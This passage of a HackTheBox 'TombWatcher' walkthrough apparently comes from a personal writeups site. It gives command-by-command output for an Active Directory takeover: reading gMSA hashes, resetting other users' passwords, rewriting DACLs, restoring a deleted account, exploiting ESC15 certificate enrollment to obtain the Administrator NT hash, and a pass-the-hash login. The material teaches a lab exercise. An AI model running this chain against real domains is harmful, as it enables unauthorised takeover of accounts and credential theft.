+<h3 id="section-getting-gmsa-passwords-from-ansible_dev-account-using-alfred-user">getting GMSA passwords from ansible_dev$ account using alfred user</h3>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+ nxc ldap <span class="nv">$ip</span> <span class="nt">-u</span> <span class="nv">$user2</span> <span class="nt">-p</span> <span class="nv">$pass2</span> <span class="nt">--gmsa</span>                                                                                                                 
+LDAP        10.10.11.72     389    DC01             <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10 / Server 2019 Build 17763 <span class="o">(</span>name:DC01<span class="o">)</span> <span class="o">(</span>domain:tombwatcher.htb<span class="o">)</span>
+LDAPS       10.10.11.72     636    DC01             <span class="o">[</span>+] tombwatcher.htb<span class="se">\A</span>lfred:basketball 
+LDAPS       10.10.11.72     636    DC01             <span class="o">[</span><span class="k">*</span><span class="o">]</span> Getting GMSA Passwords
+LDAPS       10.10.11.72     636    DC01             Account: ansible_dev<span class="nv">$ </span>        NTLM: ecb4146b3f99e6bbf06ca896f504227c     PrincipalsAllowedToReadPassword: Infrastructure
+</code></pre></div></div>
+
+<h3 id="section-change-user-sam-password">change user SAM password</h3>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bloodyAD <span class="nt">--host</span> <span class="nv">$ip</span> <span class="nt">-d</span> <span class="s1">'tombwatcher.htb'</span> <span class="nt">-u</span> <span class="s1">'ANSIBLE_DEV$'</span> <span class="nt">-p</span> :ecb4146b3f99e6bbf06ca896f504227c <span class="nb">set </span>password <span class="s1">'sam'</span> <span class="s1">'Password@123'</span>                         ─╯
+<span class="o">[</span>+] Password changed successfully!
+</code></pre></div></div>
+
+<p>Now again bloodhound and we see that user sam has WriteOwner permission to user john and we can use it .</p>
+
+<p>![[Pasted image 20250904134356.png]]</p>
+
+<h3 id="section-modify-the-owner-of-theuserjohn">modify the owner of the user JOHN</h3>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>impacket-owneredit tombwatcher.htb/sam:<span class="s1">'Password@123'</span> <span class="nt">-action</span> write <span class="nt">-new-owner</span> <span class="s1">'sam'</span> <span class="nt">-target</span> <span class="s1">'john'</span>  
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+	<span class="o">[</span><span class="k">*</span><span class="o">]</span> Current owner information below
+	<span class="o">[</span><span class="k">*</span><span class="o">]</span> - SID: S-1-5-21-1392491010-1358638721-2126982587-512
+	<span class="o">[</span><span class="k">*</span><span class="o">]</span> - sAMAccountName: Domain Admins
+	<span class="o">[</span><span class="k">*</span><span class="o">]</span> - distinguishedName: <span class="nv">CN</span><span class="o">=</span>Domain Admins,CN<span class="o">=</span>Users,DC<span class="o">=</span>tombwatcher,DC<span class="o">=</span>htb
+	<span class="o">[</span><span class="k">*</span><span class="o">]</span> OwnerSid modified successfully!
+</code></pre></div></div>
+
+<h3 id="section-granting--user-sam--rights-over-target">granting  user SAM  rights over target.</h3>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>impacket-dacledit <span class="nt">-action</span> write <span class="nt">-rights</span> <span class="s1">'FullControl'</span> <span class="nt">-principal</span> <span class="s1">'sam'</span> <span class="nt">-target</span> <span class="s1">'john'</span> <span class="s1">'tombwatcher.htb'</span>/<span class="s1">'sam'</span>:<span class="s1">'Password@123'</span>        
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+	<span class="o">[</span><span class="k">*</span><span class="o">]</span> DACL backed up to dacledit-20250904-143656.bak
+	<span class="o">[</span><span class="k">*</span><span class="o">]</span> DACL modified successfully!
+</code></pre></div></div>
+
+<h3 id="section-now-to-access-user-john-we-still-need-creds-which-we-do-not-have-so-now-again-we-can-just-change-user-password">now to access user JOHN we still need creds which we do not have so now again we can just change user password</h3>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>bloodyAD <span class="nt">--host</span> <span class="s2">"10.10.11.72"</span> <span class="nt">-d</span> <span class="s2">"tombwatcher.htb"</span> <span class="nt">-u</span> <span class="s2">"sam"</span> <span class="nt">-p</span> <span class="s2">"Password@123"</span> <span class="nb">set </span>password <span class="s2">"john"</span> <span class="s2">"Password@1234"</span>                                     
+	<span class="o">[</span>+] Password changed successfully!
+</code></pre></div></div>
+
+<p><code class="language-plaintext highlighter-rouge">Password changed now we can do evil-winrm</code></p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code> 
+<span class="nv">$ </span>evil-winrm <span class="nt">-i</span> <span class="nv">$ip</span> <span class="nt">-u</span> john <span class="nt">-p</span> <span class="s1">'Password@1234'</span>                              
+	Evil-WinRM shell v3.7
+
+	<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\j</span>ohn<span class="se">\D</span>ocuments&gt; <span class="nb">whoami
+	</span>tombwatcher<span class="se">\j</span>ohn
+	<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\j</span>ohn<span class="se">\D</span>ocuments&gt; more C:<span class="se">\U</span>sers<span class="se">\j</span>ohn<span class="se">\D</span>esktop<span class="se">\u</span>ser.txt
+	<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\j</span>ohn<span class="se">\D</span>ocuments&gt; 
+</code></pre></div></div>
+
+<h4 id="section-got-usertxt-now-time-for-roottxt">got user.txt now time for root.txt</h4>
+
+<hr />
+<p>![[Pasted image 20250904154001.png]]</p>
+
+<ul>
+  <li>john has GenericAll permission for ADCS so now we can use Certipy to find something around certificates services</li>
+</ul>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="nv">$ </span>certipy-ad find <span class="nt">-u</span> john@tombwatcher.htb <span class="nt">-p</span> <span class="s1">'Password@1234'</span> <span class="nt">-dc-ip</span> 10.10.11.72 <span class="nt">-stdout</span> 
+<span class="c"># "Pay attention to template 17, which is interesting.</span>
+	 17
+    Template Name                       : WebServer
+    Display Name                        : Web Server
+    Certificate Authorities             : tombwatcher-CA-1
+    Enabled                             : True
+    Client Authentication               : False
+    Enrollment Agent                    : False
+    Any Purpose                         : False
+    Enrollee Supplies Subject           : True
+    Certificate Name Flag               : EnrolleeSuppliesSubject
+    Extended Key Usage                  : Server Authentication
+    Requires Manager Approval           : False
+    Requires Key Archival               : False
+    Authorized Signatures Required      : 0
+    Schema Version                      : 1
+    Validity Period                     : 2 years
+    Renewal Period                      : 6 weeks
+    Minimum RSA Key Length              : 2048
+    Template Created                    : 2024-11-16T00:57:49+00:00
+    Template Last Modified              : 2024-11-16T17:07:26+00:00
+    Permissions
+      Enrollment Permissions
+        Enrollment Rights               : TOMBWATCHER.HTB<span class="se">\D</span>omain Admins
+                                          TOMBWATCHER.HTB<span class="se">\E</span>nterprise Admins
+                                          S-1-5-21-1392491010-1358638721-2126982587-1111
+      Object Control Permissions
+        Owner                           : TOMBWATCHER.HTB<span class="se">\E</span>nterprise Admins
+        Full Control Principals         : TOMBWATCHER.HTB<span class="se">\D</span>omain Admins
+                                          TOMBWATCHER.HTB<span class="se">\E</span>nterprise Admins
+        Write Owner Principals          : TOMBWATCHER.HTB<span class="se">\D</span>omain Admins
+                                          TOMBWATCHER.HTB<span class="se">\E</span>nterprise Admins
+        Write Dacl Principals           : TOMBWATCHER.HTB<span class="se">\D</span>omain Admins
+                                          TOMBWATCHER.HTB<span class="se">\E</span>nterprise Admins
+        Write Property Enroll           : TOMBWATCHER.HTB<span class="se">\D</span>omain Admins
+                                          TOMBWATCHER.HTB<span class="se">\E</span>nterprise Admins
+                                          S-1-5-21-1392491010-1358638721-2126982587-1111
+</code></pre></div></div>
+
+<p>after researching found out that  sid : <code class="language-plaintext highlighter-rouge">S-1-5-21-1392491010-1358638721-2126982587-1111</code>  is not human readable and should have deleted from AD so there should be somewhat misconfiguration still present in environment.</p>
+
+<ul>
+  <li>so we can do privilege escalation or abuse of certificate enrollment.</li>
+  <li>so privious we see that something was deleted so we should check recyclebin
+```shell</li>
+</ul>
+
+<p>$ Get-ADObject -Filter ‘IsDeleted -eq $true’ -IncludeDeletedObjects -Properties *</p>
+
+<p>CanonicalName                   : tombwatcher.htb/Deleted Objects
+CN                              : Deleted Objects
+Created                         : 11/15/2024 7:01:41 PM
+createTimeStamp                 : 11/15/2024 7:01:41 PM
+Deleted                         : True
+Description                     : Default container for deleted objects
+DisplayName                     :
+DistinguishedName               : CN=Deleted Objects,DC=tombwatcher,DC=htb
+dSCorePropagationData           : {12/31/1600 7:00:00 PM}
+instanceType                    : 4
+isCriticalSystemObject          : True
+isDeleted                       : True
+LastKnownParent                 :
+Modified                        : 11/15/2024 7:56:00 PM
+modifyTimeStamp                 : 11/15/2024 7:56:00 PM
+Name                            : Deleted Objects
+ObjectCategory                  : CN=Container,CN=Schema,CN=Configuration,DC=tombwatcher,DC=htb
+ObjectClass                     : container
+ObjectGUID                      : 34509cb3-2b23-417b-8b98-13f0bd953319
+ProtectedFromAccidentalDeletion :
+sDRightsEffective               : 0
+showInAdvancedViewOnly          : True
+systemFlags                     : -1946157056
+uSNChanged                      : 12851
+uSNCreated                      : 5659
+whenChanged                     : 11/15/2024 7:56:00 PM
+whenCreated                     : 11/15/2024 7:01:41 PM</p>
+
+<p>accountExpires                  : 9223372036854775807
+badPasswordTime                 : 0
+badPwdCount                     : 0
+CanonicalName                   : tombwatcher.htb/Deleted Objects/cert_admin
+                                  DEL:f80369c8-96a2-4a7f-a56c-9c15edd7d1e3
+CN                              : cert_admin
+                                  DEL:f80369c8-96a2-4a7f-a56c-9c15edd7d1e3
+codePage                        : 0
+countryCode                     : 0
+Created                         : 11/15/2024 7:55:59 PM
+createTimeStamp                 : 11/15/2024 7:55:59 PM
+Deleted                         : True
+Description                     :
+DisplayName                     :
+DistinguishedName               : CN=cert_admin\0ADEL:f80369c8-96a2-4a7f-a56c-9c15edd7d1e3,CN=Deleted Objects,DC=tombwatcher,DC=htb
+dSCorePropagationData           : {11/15/2024 7:56:05 PM, 11/15/2024 7:56:02 PM, 12/31/1600 7:00:01 PM}
+givenName                       : cert_admin
+instanceType                    : 4
+isDeleted                       : True
+LastKnownParent                 : OU=ADCS,DC=tombwatcher,DC=htb
+lastLogoff                      : 0
+lastLogon                       : 0
+logonCount                      : 0
+Modified                        : 11/15/2024 7:57:59 PM
+modifyTimeStamp                 : 11/15/2024 7:57:59 PM
+msDS-LastKnownRDN               : cert_admin
+Name                            : cert_admin
+                                  DEL:f80369c8-96a2-4a7f-a56c-9c15edd7d1e3
+nTSecurityDescriptor            : System.DirectoryServices.ActiveDirectorySecurity
+ObjectCategory                  :
+ObjectClass                     : user
+ObjectGUID                      : f80369c8-96a2-4a7f-a56c-9c15edd7d1e3
+objectSid                       : S-1-5-21-1392491010-1358638721-2126982587-1109
+primaryGroupID                  : 513
+ProtectedFromAccidentalDeletion : False
+pwdLastSet                      : 133761921597856970
+sAMAccountName                  : cert_admin
+sDRightsEffective               : 7
+sn                              : cert_admin
+userAccountControl              : 66048
+uSNChanged                      : 12975
+uSNCreated                      : 12844
+whenChanged                     : 11/15/2024 7:57:59 PM
+whenCreated                     : 11/15/2024 7:55:59 PM</p>
+
+<p>accountExpires                  : 9223372036854775807
+badPasswordTime                 : 0
+badPwdCount                     : 0
+CanonicalName                   : tombwatcher.htb/Deleted Objects/cert_admin
+                                  DEL:c1f1f0fe-df9c-494c-bf05-0679e181b358
+CN                              : cert_admin
+                                  DEL:c1f1f0fe-df9c-494c-bf05-0679e181b358
+codePage                        : 0
+countryCode                     : 0
+Created                         : 11/16/2024 12:04:05 PM
+createTimeStamp                 : 11/16/2024 12:04:05 PM
+Deleted                         : True
+Description                     :
+DisplayName                     :
+DistinguishedName               : CN=cert_admin\0ADEL:c1f1f0fe-df9c-494c-bf05-0679e181b358,CN=Deleted Objects,DC=tombwatcher,DC=htb
+dSCorePropagationData           : {11/16/2024 12:04:18 PM, 11/16/2024 12:04:08 PM, 12/31/1600 7:00:00 PM}
+givenName                       : cert_admin
+instanceType                    : 4
+isDeleted                       : True
+LastKnownParent                 : OU=ADCS,DC=tombwatcher,DC=htb
+lastLogoff                      : 0
+lastLogon                       : 0
+logonCount                      : 0
+Modified                        : 11/16/2024 12:04:21 PM
+modifyTimeStamp                 : 11/16/2024 12:04:21 PM
+msDS-LastKnownRDN               : cert_admin
+Name                            : cert_admin
+                                  DEL:c1f1f0fe-df9c-494c-bf05-0679e181b358
+nTSecurityDescriptor            : System.DirectoryServices.ActiveDirectorySecurity
+ObjectCategory                  :
+ObjectClass                     : user
+ObjectGUID                      : c1f1f0fe-df9c-494c-bf05-0679e181b358
+objectSid                       : S-1-5-21-1392491010-1358638721-2126982587-1110
+primaryGroupID                  : 513
+ProtectedFromAccidentalDeletion : False
+pwdLastSet                      : 133762502455822446
+sAMAccountName                  : cert_admin
+sDRightsEffective               : 7
+sn                              : cert_admin
+userAccountControl              : 66048
+uSNChanged                      : 13171
+uSNCreated                      : 13161
+whenChanged                     : 11/16/2024 12:04:21 PM
+whenCreated                     : 11/16/2024 12:04:05 PM</p>
+
+<p>accountExpires                  : 9223372036854775807
+badPasswordTime                 : 0
+badPwdCount                     : 0
+CanonicalName                   : tombwatcher.htb/Deleted Objects/cert_admin
+                                  DEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf
+CN                              : cert_admin
+                                  DEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf
+codePage                        : 0
+countryCode                     : 0
+Created                         : 11/16/2024 12:07:04 PM
+createTimeStamp                 : 11/16/2024 12:07:04 PM
+Deleted                         : True
+Description                     :
+DisplayName                     :
+DistinguishedName               : CN=cert_admin\0ADEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf,CN=Deleted Objects,DC=tombwatcher,DC=htb
+dSCorePropagationData           : {11/16/2024 12:07:10 PM, 11/16/2024 12:07:08 PM, 12/31/1600 7:00:00 PM}
+givenName                       : cert_admin
+instanceType                    : 4
+isDeleted                       : True
+LastKnownParent                 : OU=ADCS,DC=tombwatcher,DC=htb
+lastLogoff                      : 0
+lastLogon                       : 0
+logonCount                      : 0
+Modified                        : 11/16/2024 12:07:27 PM
+modifyTimeStamp                 : 11/16/2024 12:07:27 PM
+msDS-LastKnownRDN               : cert_admin
+Name                            : cert_admin
+                                  DEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf
+nTSecurityDescriptor            : System.DirectoryServices.ActiveDirectorySecurity
+ObjectCategory                  :
+ObjectClass                     : user
+ObjectGUID                      : 938182c3-bf0b-410a-9aaa-45c8e1a02ebf
+objectSid                       : S-1-5-21-1392491010-1358638721-2126982587-1111
+primaryGroupID                  : 513
+ProtectedFromAccidentalDeletion : False
+pwdLastSet                      : 133762504248946345
+sAMAccountName                  : cert_admin
+sDRightsEffective               : 7
+sn                              : cert_admin
+userAccountControl              : 66048
+uSNChanged                      : 13197
+uSNCreated                      : 13186
+whenChanged                     : 11/16/2024 12:07:27 PM
+whenCreated                     : 11/16/2024 12:07:04 PM</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+- so deleted object was cert_admin so we can try to restore again and reset user password 
+
+	```shell
+	# restore object
+	$ Restore-ADObject -Identity "CN=cert_admin\0ADEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf,CN=Deleted Objects,DC=tombwatcher,DC=htb" 
+	
+	# reset password
+	$ Set-ADAccountPassword -Identity "cert_admin" -Reset -NewPassword (ConvertTo-SecureString "Password@1234" -AsPlainText -Force)
+	
+	```
+
+---
+### Varifying certificate user cert_admin
+
+```shell
+
+$ certipy-ad find -vulnerable -u cert_admin@tombwatcher.htb -p 'Password@1234' -dc-ip 10.10.11.72 -stdout
+
+	Certificate Authorities
+	  0
+	    CA Name                             : tombwatcher-CA-1
+	    DNS Name                            : DC01.tombwatcher.htb
+	    Certificate Subject                 : CN=tombwatcher-CA-1, DC=tombwatcher, DC=htb
+	    Certificate Serial Number           : 3428A7FC52C310B2460F8440AA8327AC
+	    Certificate Validity Start          : 2024-11-16 00:47:48+00:00
+	    Certificate Validity End            : 2123-11-16 00:57:48+00:00
+	    Web Enrollment
+	      HTTP
+	        Enabled                         : False
+	      HTTPS
+	        Enabled                         : False
+	    User Specified SAN                  : Disabled
+	    Request Disposition                 : Issue
+	    Enforce Encryption for Requests     : Enabled
+	    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
+	    Permissions
+	      Owner                             : TOMBWATCHER.HTB\Administrators
+	      Access Rights
+	        ManageCa                        : TOMBWATCHER.HTB\Administrators
+	                                          TOMBWATCHER.HTB\Domain Admins
+	                                          TOMBWATCHER.HTB\Enterprise Admins
+	        ManageCertificates              : TOMBWATCHER.HTB\Administrators
+	                                          TOMBWATCHER.HTB\Domain Admins
+	                                          TOMBWATCHER.HTB\Enterprise Admins
+	        Enroll                          : TOMBWATCHER.HTB\Authenticated Users
+	Certificate Templates
+	  0
+	    Template Name                       : WebServer
+	    Display Name                        : Web Server
+	    Certificate Authorities             : tombwatcher-CA-1
+	    Enabled                             : True
+	    Client Authentication               : False
+	    Enrollment Agent                    : False
+	    Any Purpose                         : False
+	    Enrollee Supplies Subject           : True
+	    Certificate Name Flag               : EnrolleeSuppliesSubject
+	    Extended Key Usage                  : Server Authentication
+	    Requires Manager Approval           : False
+	    Requires Key Archival               : False
+	    Authorized Signatures Required      : 0
+	    Schema Version                      : 1
+	    Validity Period                     : 2 years
+	    Renewal Period                      : 6 weeks
+	    Minimum RSA Key Length              : 2048
+	    Template Created                    : 2024-11-16T00:57:49+00:00
+	    Template Last Modified              : 2024-11-16T17:07:26+00:00
+	    Permissions
+	      Enrollment Permissions
+	        Enrollment Rights               : TOMBWATCHER.HTB\Domain Admins
+	                                          TOMBWATCHER.HTB\Enterprise Admins
+	                                          TOMBWATCHER.HTB\cert_admin
+	      Object Control Permissions
+	        Owner                           : TOMBWATCHER.HTB\Enterprise Admins
+	        Full Control Principals         : TOMBWATCHER.HTB\Domain Admins
+	                                          TOMBWATCHER.HTB\Enterprise Admins
+	        Write Owner Principals          : TOMBWATCHER.HTB\Domain Admins
+	                                          TOMBWATCHER.HTB\Enterprise Admins
+	        Write Dacl Principals           : TOMBWATCHER.HTB\Domain Admins
+	                                          TOMBWATCHER.HTB\Enterprise Admins
+	        Write Property Enroll           : TOMBWATCHER.HTB\Domain Admins
+	                                          TOMBWATCHER.HTB\Enterprise Admins
+	                                          TOMBWATCHER.HTB\cert_admin
+	    [+] User Enrollable Principals      : TOMBWATCHER.HTB\cert_admin
+	    [!] Vulnerabilities
+	      ESC15                             : Enrollee supplies subject and schema version is 1.
+	    [*] Remarks
+	      ESC15                             : Only applicable if the environment has not been patched. See CVE-2024-49019 or the wiki for more details.
+</code></pre></div></div>
+
+<p>we can see vuln : ESC15 and WebServer template again but with vuln which was not in privious attempt</p>
+
+<hr />
+
+<h1 id="section-exploitation">Exploitation</h1>
+<h2 id="section-️-we-can-exploit-esc15-vulnerability">▶️ we can exploit ESC15 vulnerability</h2>
+
+<ul>
+  <li>
+    <p>Request cert_admin certificate</p>
+
+    <div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	
+  <span class="nv">$ </span>certipy-ad req <span class="nt">-u</span> <span class="s1">'cert_admin@tombwatcher.htb'</span> <span class="nt">-p</span> <span class="s1">'Password@1234'</span> <span class="nt">-dc-ip</span> <span class="s1">'10.10.11.72'</span> <span class="nt">-target</span> <span class="s1">'dc01.tombwatcher.htb'</span> <span class="nt">-ca</span> <span class="s1">'tombwatcher-CA-1'</span> <span class="nt">-template</span> <span class="s1">'WebServer'</span> <span class="nt">-application-policies</span> <span class="s1">'Certificate Request Agent'</span> 
+  Certipy v5.0.3 - by Oliver Lyak <span class="o">(</span>ly4k<span class="o">)</span>
+	
+  <span class="o">[</span><span class="k">*</span><span class="o">]</span> Requesting certificate via RPC
+  <span class="o">[</span><span class="k">*</span><span class="o">]</span> Request ID is 3
+  <span class="o">[</span><span class="k">*</span><span class="o">]</span> Successfully requested certificate
+  <span class="o">[</span><span class="k">*</span><span class="o">]</span> Got certificate without identity
+  <span class="o">[</span><span class="k">*</span><span class="o">]</span> Certificate has no object SID
+  <span class="o">[</span><span class="k">*</span><span class="o">]</span> Try using <span class="nt">-sid</span> to <span class="nb">set </span>the object SID or see the wiki <span class="k">for </span>more details
+  <span class="o">[</span><span class="k">*</span><span class="o">]</span> Saving certificate and private key to <span class="s1">'cert_admin.pfx'</span>
+  <span class="o">[</span><span class="k">*</span><span class="o">]</span> Wrote certificate and private key to <span class="s1">'cert_admin.pfx'</span>
+</code></pre></div>    </div>
+  </li>
+  <li>Use that certificate to request another one (administrator) on behalf of the domain admin
+    <div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code> certipy-ad req <span class="nt">-u</span> <span class="s1">'cert_admin@tombwatcher.htb'</span> <span class="nt">-p</span> <span class="s1">'Password@1234'</span> <span class="nt">-dc-ip</span> <span class="s1">'10.10.11.72'</span> <span class="nt">-target</span> <span class="s1">'dc01.tombwatcher.htb'</span> <span class="nt">-ca</span> <span class="s1">'tombwatcher-CA-1'</span> <span class="nt">-template</span> <span class="s1">'User'</span> <span class="nt">-pfx</span> <span class="s1">'cert_admin.pfx'</span> <span class="nt">-on-behalf-of</span> <span class="s1">'TOMBWATCHER\Administrator'</span>
+ Certipy v5.0.3 - by Oliver Lyak <span class="o">(</span>ly4k<span class="o">)</span>
+	
+ <span class="o">[</span><span class="k">*</span><span class="o">]</span> Requesting certificate via RPC
+ <span class="o">[</span><span class="k">*</span><span class="o">]</span> Request ID is 4
+ <span class="o">[</span><span class="k">*</span><span class="o">]</span> Successfully requested certificate
+ <span class="o">[</span><span class="k">*</span><span class="o">]</span> Got certificate with UPN <span class="s1">'Administrator@tombwatcher.htb'</span>
+ <span class="o">[</span><span class="k">*</span><span class="o">]</span> Certificate object SID is <span class="s1">'S-1-5-21-1392491010-1358638721-2126982587-500'</span>
+ <span class="o">[</span><span class="k">*</span><span class="o">]</span> Saving certificate and private key to <span class="s1">'administrator.pfx'</span>
+ <span class="o">[</span><span class="k">*</span><span class="o">]</span> Wrote certificate and private key to <span class="s1">'administrator.pfx'</span>
+</code></pre></div>    </div>
+  </li>
+  <li>final step to ntlm hash for administrator
+    <div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="nv">$ </span>certipy-ad auth <span class="nt">-pfx</span> <span class="s1">'administrator.pfx'</span> <span class="nt">-dc-ip</span> <span class="s1">'10.10.11.72'</span>                                                         ─╯
+  Certipy v5.0.3 - by Oliver Lyak <span class="o">(</span>ly4k<span class="o">)</span>
+	
+  <span class="o">[</span><span class="k">*</span><span class="o">]</span> Certificate identities:
+  <span class="o">[</span><span class="k">*</span><span class="o">]</span>     SAN UPN: <span class="s1">'Administrator@tombwatcher.htb'</span>
+  <span class="o">[</span><span class="k">*</span><span class="o">]</span>     Security Extension SID: <span class="s1">'S-1-5-21-1392491010-1358638721-2126982587-500'</span>
+  <span class="o">[</span><span class="k">*</span><span class="o">]</span> Using principal: <span class="s1">'administrator@tombwatcher.htb'</span>
+  <span class="o">[</span><span class="k">*</span><span class="o">]</span> Trying to get TGT...
+  <span class="o">[</span><span class="k">*</span><span class="o">]</span> Got TGT
+  <span class="o">[</span><span class="k">*</span><span class="o">]</span> Saving credential cache to <span class="s1">'administrator.ccache'</span>
+  <span class="o">[</span><span class="k">*</span><span class="o">]</span> Wrote credential cache to <span class="s1">'administrator.ccache'</span>
+  <span class="o">[</span><span class="k">*</span><span class="o">]</span> Trying to retrieve NT <span class="nb">hash </span><span class="k">for</span> <span class="s1">'administrator'</span>
+  <span class="o">[</span><span class="k">*</span><span class="o">]</span> Got <span class="nb">hash </span><span class="k">for</span> <span class="s1">'administrator@tombwatcher.htb'</span>: aad3b435b51404eeaad3b435b51404ee:f61db423bebe3328d33af26741afe5fc
+</code></pre></div>    </div>
+  </li>
+</ul>
+
+<hr />
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>evil-winrm <span class="nt">-i</span> 10.10.11.72 <span class="nt">-u</span> administrator <span class="nt">-H</span> f61db423bebe3328d33af26741afe5fc 
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator&gt; <span class="nb">cd</span> ..
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator&gt; <span class="nb">cd </span>Desktop
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator&gt; more root.txt
+</code></pre></div></div>
+
+<hr />
+
+<h1 id="section-tools-used">Tools used</h1>
+<ul>
+  <li>nmap</li>
+  <li>impacket-scripts</li>
+  <li>bloodyAD</li>
+  <li>certipy-ad</li>
+  <li>evil-winrm</li>
+</ul>
+
+<hr />
+<h1 id="section-references">References</h1>
+<ul>
+  <li><a href="https://github.com/ShutdownRepo/targetedKerberoast">targetedKerberoast.py  </a></li>
+  <li><a href="https://learn.microsoft.com/en-us/defender-for-identity/prevent-certificate-enrollment-esc15">ESC15 vulnerability</a></li>
+</ul>
+
+<hr />
+
+            </div>
+
+            <!-- Navigation Buttons -->
+            <div class="mt-8 sm:mt-12 flex flex-col md:flex-row items-center justify-between gap-3 sm:gap-4" data-aos="fade-up" data-aos-duration="600">
+                
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                
+                    
+                        
+                        
+                        
+                        
+
+                <!-- Previous Writeup -->
+                
+                    
+                    <a href="/writeups/hackthebox/Artificial-Hackthebox-Walkthrough/" class="nav-button group flex items-center justify-center bg-cyber-green/10 text-cyber-green px-4 sm:px-6 py-2 sm:py-3 rounded-lg hover:bg-cyber-green/20 transition-all duration-300 border border-cyber-green/20 hover:border-cyber-green/40 w-full md:w-auto" data-aos="fade-right" data-aos-duration="400">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="h-4 sm:h-5 w-4 sm:w-5 mr-2 transform transition-transform duration-200 ease-spring group-hover:-translate-x-1" viewBox="0 0 20 20" fill="currentColor">
+                            <path fill-rule="evenodd" d="M9.707 16.707a1 1 0 01-1.414 0l-6-6a1 1 0 010-1.414l6-6a1 1 0 011.414 1.414L5.414 9H17a1 1 0 110 2H5.414l4.293 4.293a1 1 0 010 1.414z" clip-rule="evenodd" />
+                        </svg>
+                        <span class="font-mono">Previous</span>
+                    </a>
+                
+
+                <!-- Back to Index -->
+                <a href="/writeups" class="nav-button group flex items-center justify-center bg-cyber-black/50 text-cyber-green px-4 sm:px-6 py-2 sm:py-3 rounded-lg hover:bg-cyber-black/70 transition-all duration-300 border border-cyber-green/20 hover:border-cyber-green/40 w-full md:w-auto" data-aos="fade-up" data-aos-duration="400">
+                    <span class="font-mono">cd ../writeups</span>
+                </a>
+
+                <!-- Next Writeup -->
+                
+                    <div class="w-full md:w-auto"></div>
+                
+            </div>
+        </div>
+    </div>
+</article>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-core.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/plugins/autoloader/prism-autoloader.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/plugins/line-numbers/prism-line-numbers.min.js"></script>
+
+<style>
+/* Custom styles for tables */
+.markdown-content table {
+    width: 100%;
+    border-collapse: collapse;
+    background: rgba(26, 26, 26, 0.7);
+    backdrop-filter: blur(12px);
+    -webkit-backdrop-filter: blur(12px);
+    border: 1px solid rgba(74, 222, 128, 0.1);
+    border-radius: 0.5rem;
+    margin: 1rem 0 1.5rem;
+    display: table;
+    overflow-x: auto;
+    max-width: 100%;
+}
+
+.markdown-content thead {
+    background: rgba(55, 65, 81, 0.5);
+}
+
+.markdown-content th {
+    background: transparent;
+    text-align: left;
+    padding: 0.75rem 1rem;
+    font-weight: 600;
+    border-bottom: 1px solid rgba(74, 222, 128, 0.1);
+    color: #4ade80;
+    white-space: nowrap;
+}
+
+.markdown-content td {
+    padding: 0.75rem 1rem;
+    border-bottom: 1px solid rgba(74, 222, 128, 0.1);
+    min-width: 100px;
+}
+
+.markdown-content tr:hover {
+    background: rgba(74, 222, 128, 0.05);
+    transition: background-color 0.2s;
+}
+
+.markdown-content tbody tr:last-child td {
+    border-bottom: none;
+}
+
+/* Table wrapper for horizontal scrolling on mobile */
+.markdown-content .table-wrapper {
+    overflow-x: auto;
+    margin: 1rem -1rem;
+    padding: 0 1rem;
+    -webkit-overflow-scrolling: touch;
+}
+
+@media (max-width: 768px) {
+    .markdown-content table {
+        font-size: 0.875rem;
+    }
+
+    .markdown-content th,
+    .markdown-content td {
+        padding: 0.625rem 0.875rem;
+    }
+}
+
+/* Custom styles for code blocks */
+.markdown-content pre[class*="language-"] {
+    border-radius: 0.5rem;
+    margin: 1rem 0 1.5rem;
+    background: rgba(17, 17, 17, 0.95) !important;
+    backdrop-filter: blur(12px);
+    -webkit-backdrop-filter: blur(12px);
+    border: 1px solid rgba(74, 222, 128, 0.1);
+    box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1), 0 2px 4px -1px rgba(0, 0, 0, 0.06);
+    font-size: 0.875rem;
+    overflow-x: auto;
+    -webkit-overflow-scrolling: touch;
+    padding: 1rem;
+}
+
+/* Hide line numbers on desktop */
+@media (min-width: 641px) {
